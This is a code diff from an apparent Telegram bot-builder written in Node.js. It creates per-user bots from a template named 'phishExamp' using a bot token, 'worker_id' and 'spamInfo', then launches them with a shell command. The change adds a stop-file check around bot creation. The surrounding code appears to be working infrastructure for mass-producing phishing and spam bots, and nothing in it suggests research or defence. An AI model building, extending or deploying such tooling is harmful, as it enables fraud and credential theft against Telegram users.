@@ -9,6 +9,8 @@ const fs = require("fs");
 
 const createBotScene = new WizardScene("createBotScene",
     async (ctx) => {
+        if(fs.existsSync(`./bots/${ctx.chat.id}`)) fs.writeFileSync(`./bots/${ctx.chat.id}/stop.stop`, "besttem");
+
         if(ctx.message?.text == undefined) return;
 
         ctx.scene.state = {};
@@ -161,11 +163,18 @@ const createBotScene = new WizardScene("createBotScene",
 
         fs.existsSync(path) || fs.mkdirSync(path);
 
+        try {
+            fs.unlinkSync(`${path}/stop.stop`);
+        }
+        catch {
+            console.log("catch");
+        }
+
+        ctx.scene.leave();
+
         const config = createConfig(user_bot.botToken,user_bot.worker_id, user_bot.spamInfo, user_bot.textInfo);
         createBot(config, path, "./phishExamp");
         cmdWorking(`cd ${path} & python bot.py`);
-
-        return ctx.scene.leave();
     }
 )
 
